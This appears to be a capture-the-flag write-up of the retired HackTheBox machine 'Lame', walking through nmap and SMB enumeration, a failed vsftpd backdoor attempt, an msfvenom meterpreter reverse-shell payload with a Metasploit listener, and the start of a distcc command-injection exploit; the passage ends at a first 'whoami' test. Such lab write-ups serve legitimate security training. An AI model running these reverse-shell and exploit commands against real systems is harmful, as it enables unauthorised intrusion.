This machine can be accessed on [HackTheBox](https://app.hackthebox.com/machines/Lame) in the Retired Machines section.

Please note that while the information in this article will help you complete the challenge and get both flags on the box, it won't be written in a clear-cut how-to style. Instead, it will describe my thought process and the steps I took to solve the box.

This, in my opinion, gives more value than merely giving you step by step instructions.

The article will include both Metasploit and non-Metasploit solutions, and it might be solved in a different way than the intended path. 

For OSCP, solving it without Metasploit is a useful exercise.

## **Scanning & Enumeration**

### **Running Nmap**

```bash
nmap -sV -sC -oA nmap/top1000 10.10.10.3 -vv

-sC: equivalent to --script=default
-sV: Probe open ports to determine service/version info
-oA <basename>: Output in the three major formats at once
-v: Increase verbosity level (use -vv or more for greater effect)
```

We pick up on an odd thing right away. As though the host is blocking our probes and/or is protected by a firewall, our scanning produces no results. 
![Nmap scan produces no results](/assets/img/htb-lame/nmap_host_down.png)
_Nmap Scan - Host Down_

Next, we try to ping the host but we notice it is actually responding, so definitely not blocking ICMP traffic:
![ICMP probing](/assets/img/htb-lame/icmp_probes.png)
_ICMP Probes_

Let us try nmap with the `-Pn` switch to see what happens:

```bash
nmap -Pn 10.10.10.3
```

![Nmap scanning with the -Pn switch](/assets/img/htb-lame/nmap_pn_switch.png)
_Nmap -Pn Scan_

We do get a couple of ports open this time. Due to the fact that the host is ping responsive, it is a bit weird that I cannot scan it with the first nmap command.

When running it with sudo privileges however, we get a different result:
![Running nmap with sudo privileges](/assets/img/htb-lame/nmap_sudo.png)
_Running nmap with sudo privileges_

So the same command yields different results. Why? By default, nmap scans work like this:
- A privileged user executes a `-sS` scan (TCP SYN scan [stealth scan])
	- This type of scan requires raw socket / raw packet privileges.
- An unprivileged user executes a `-sT` scan (TCP connect scan).
	- This type of scan does not require raw socket / raw packet privileges.

If we try to execute a stealth scan in the user context, we can verify the above:
![Nmap scanning with the -sS switch as an unprivileged user](/assets/img/htb-lame/nmap_access_denied.png)
_Nmap -sS Access Denied_

I have decided to continue with the -Pn scan this time so I don't have to elevate my access, however it is a good idea to keep in mind this behavior. If you are stuck it is always a good idea to try and run a stealth scan to see if any ports were missed.

```bash
nmap -Pn -sC -sV -oN nmap/top1000 10.10.10.3

### **Exploring FTP Anonymous Login**

Since we can connect to the FTP server anonymously, let's try to see if we can find anything useful stored there:
![FTP Initial Access](/assets/img/htb-lame/ftp_initial.png)
_FTP Initial Access_

There is nothing in the FTP directory unfortunately, we can gather a few more details by running `status`:
![FTP details resulting from the status command](/assets/img/htb-lame/ftp_status.png)
_FTP Status Command_

Next, we can try searching for exploits based on the version that was leaked with `searchsploit vsftpd 2.3`:
![vsftpd 2.3 exploits in Metasploit](/assets/img/htb-lame/searchsploit_vsftpd.png)
_Vsftpd Exploits in Metasploit_

It seems like we have a potential Backdoor Command Execution vulnerability that we can exploit either manually or via Metasploit. We'll keep this for later. For the time being, let expand our findings by further enumerating the box.

### **Enumerating SMB with Enum4Linux**

Since SMB is open, we can try to enumerate it with `enum4linux -a 10.10.10.3`. The `-a` switch is for performing all simple enumeration tasks at once. It uses `-U -S -G -P -r -o -n` and `-i`. Check the tool manual for more information.

[34m ================================( [0m[32mGetting printer info for 10.10.10.3[0m[34m )================================

[0mNo printers returned.

enum4linux complete on Wed Oct  5 10:19:06 2022
```

Looking at the output we notice that there is no password policy in place and that there are two custom shared folders:

```bash
Sharename       Type      Comment
---------       ----      -------
tmp             Disk      oh noes!
opt             Disk   
```

We can connect to the tmp folder anonymously based on the enum4linux output: 
```bash
//10.10.10.3/tmp	[35mMapping: [0mOK[35m Listing: [0mOK[35m Writing: [0mN/A`
```

We can also list these shares ourselves by using `smbclient -L 10.10.10.3`:
![Listing SMB shares](/assets/img/htb-lame/smbclient_initial_access.png)
_Listing SMB Shares_

Now, let's try connecting to that `/tmp` share we saw we have access to anonymously by running `smbclient \\\\10.10.10.3\\tmp`:
![Initial SMB access to the /tmp share](/assets/img/htb-lame/smbclient_initial_access.png)
_Accessing The /tmp Share_

Whilst there is nothing of interest here at first glance, we have write access so maybe we can leverage this later by uploading a reverse shell and executing it.

## **Exploitation**

### **Attacking FTP**

Using Metasploit, we search for the FTP exploit, configure and run it:
![Configuring Metasploit exploit for vsftpd](/assets/img/htb-lame/metasploit_vsftpd.png)
_Metasploit Exploit Configuration for vsftpd_

We unfortunately get no shell back:
Using Metasploit, we search for the FTP exploit, configure and run it:
![Not getting a shell back due to the Metasploit exploit failing to generate one](/assets/img/htb-lame/metasploit_vsftpd_noshell.png)
_Metasploit Exploit Failure_

I have tried mapping the hostname we found earlier to the IP address (in `/etc/hosts`) so we can use the FQDN of the box instead, but the outcome is the same.

### Attacking SMB

Considering that we can connect to the SMB share anonymously and that we have read/write access as well as the ability to create files and folders, I then looked at the possibility of creating a `meterpreter` reverse shell and uploading it there. 

To generate the reverse shell, I have used `msfvenom`:

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f elf > rev.elf
```

I have also started a listener in `Metasploit`:

```bash
use exploit/multi/handler
set LHOST tun0
set LPORT 444
set payload linux/x86/meterpreter/reverse_tcp
run -j
```

The reverse shell was then relocated to the temporary folder, and I attempted to add executable permissions to the file:
![Access denied when modifying file acesses on the SMB share](/assets/img/htb-lame/plusx_revelf.png)
_Access Denied When Modifying File Accesses on The SMB Share_

Unfortunately, we do not have access. It seems that at this point we can't do anything else with the current accesses that we got.

### **Attacking SSH**

It is always a good idea to try and connect to the `SSH` service on the server just to see what response you will get. Sometimes, admins can configure a banner that might leak useful information.

```bash
ssh 10.10.10.3
```

![Unable to connect to SSH due to unsupported legacy keys](/assets/img/htb-lame/ssh_connection_error.png)
_Unable to Connect to SSH_

Notice that when we connect to the SSH server we get an error. This is because the version of OpenSSH included in our release of Kali disables `ssh-dss` due to it being considered legacy.

To work around that, we have to specify what key algorithm we want to use when making the ssh connection: `ssh -oHostKeyAlgorithms=+ssh-dss 10.10.10.3` 

We can also permanently fix this by adding support to legacy keys like in [this article](https://www.infosecmatter.com/solution-for-ssh-unable-to-negotiate-errors/). 

```bash
{
echo -n 'Ciphers '
ssh -Q cipher | tr '\n' ',' | sed -e 's/,$//'; echo

echo -n 'MACs '
ssh -Q mac | tr '\n' ',' | sed -e 's/,$//'; echo

echo -n 'HostKeyAlgorithms '
ssh -Q key | tr '\n' ',' | sed -e 's/,$//'; echo

echo -n 'KexAlgorithms '
ssh -Q kex | tr '\n' ',' | sed -e 's/,$//'; echo
} >> ~/.ssh/config
```

Now that we have done this, we are able to connect to the SSH server, but we don't really benefit from this service—no banners have been leaked, and we don't know of any users against whom we can try brute-forcing attacks. 

### When Running Out of Options

Since we are now out of options, there are a couple of other things we can try:
- run a nmap scan against all ports
- run additional enumeration scripts for the services that were discovered;
	- i.e. enum4linux for smb (already did that in this case);
- research vulnerabilities for the service versions you have detected;
- research vulnerabilities in the OS version identified during scanning.

### Re-running Nmap

In this instance, I've made the decision to restart `nmap` and obtain further information about ports outside the top 1000 most popular range. 

```bash
nmap -Pn -sC -sV -oN nmap/all -p- -vv 10.10.10.3

```

According to Wikipedia, in software development, `distcc` is a tool for speeding up compilation of source code by using distributed computing over a computer network. With the right configuration, distcc can dramatically reduce a project's compilation time.

Googling around for potential `distcc` exploits, we find [the following](https://www.exploit-db.com/exploits/9915).

This refers to a module already existing in `Metasploit`:
![Finding a distcc vulnerability in Metasploit](/assets/img/htb-lame/distcc_command_injection_msf.png)
_Metasploit DistCC Vulnerability_

We also find a Python script on Github that can be used to exploit this command injection vulnerability [here](https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855). There is also a [nmap script](https://nmap.org/nsedoc/scripts/distcc-cve2004-2687.html) that can be used to exploit this.

Now, we are runnig version 1 of `DistCC` which according to the [CVE-2004-2687](https://nvd.nist.gov/vuln/detail/CVE-2004-2687) is vulnerable.

### Exploiting DistCC

Let's test the recently discovered Python exploit. Please take note that we read through the script's help page to determine the settings we needed to adapt for our requirements.

```bash
python distccd.py -t 10.10.10.3 -p 3632 -c 'whoami'
```
